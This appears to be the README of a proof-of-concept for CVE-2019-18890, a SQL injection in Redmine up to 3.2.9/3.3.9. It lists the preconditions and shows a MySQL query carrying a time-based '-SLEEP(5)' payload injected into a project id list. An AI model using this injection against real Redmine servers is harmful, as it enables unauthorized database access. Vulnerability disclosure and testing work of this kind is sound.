# CVE-2019-18890
CVE-2019-18890 POC (Proof of Concept)

REDMINE UP TO 3.2.9/3.3.9 SQL INJECTION  

https://nvd.nist.gov/vuln/detail/CVE-2019-18890

## Requirements: 
+ Access credentials  
+ Subproject is required  
+ REST API is enabled  


On Mysql the first query on which injection occurs looks like the example below with the "-SLEEP(5)" being the injected part:  
<code>SELECT COUNT(*) FROM `issues` INNER JOIN `projects` ON `projects`.`id` = `issues`.`project_id` INNER JOIN `issue_statuses` ON `issue_statuses`.`id` = `issues`.`status_id` WHERE (((projects.status <> 9 AND EXISTS (SELECT 1 AS one FROM enabled_modules em WHERE em.project_id = projects.id AND em.name='issue_tracking')) AND (((projects.is_public = 1 AND projects.id NOT IN (SELECT project_id FROM members WHERE user_id IN (4,2))) AND ((issues.is_private = 0)))))) AND ((issues.status_id IN (SELECT id FROM issue_statuses WHERE is_closed=0)) AND projects.id IN (1,2,3-SLEEP(5)))</code>



